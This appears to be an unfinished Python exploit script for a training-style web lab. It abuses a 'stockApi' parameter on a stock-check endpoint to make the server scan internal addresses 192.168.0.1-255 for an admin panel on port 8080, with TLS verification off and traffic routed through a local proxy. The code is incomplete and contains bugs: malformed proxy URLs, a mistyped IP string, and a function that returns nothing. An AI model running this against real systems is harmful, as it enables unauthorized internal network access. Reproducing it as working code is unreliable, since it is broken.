import requests
import sys
import urllib3 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'https': 'http//127.0.0.1:8080', 'http': 'http//127.0.0.1:8080'}

def check_admin_hostname(url):
    check_stock_path = "/product/stock"
    admin_hostname = ''
    for i in range(1,256):
        hostname = 'http://192/168.0.%s:8080/admin' %i
        params = {'stockApi': hostname}
        r = requests.post(url + check_stock_path, data = params, verify=False, proxies=proxies)
        if r.status_code == 200:
            admin_ip_address = '192.168.0.%s' %i
            break

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])

    url = sys.argv[1]
    print("(+) Finding admin hostname...")
    admin_hostname = check_admin_hostname(url)
    # not complete
if __name__ == "__main__":
    main()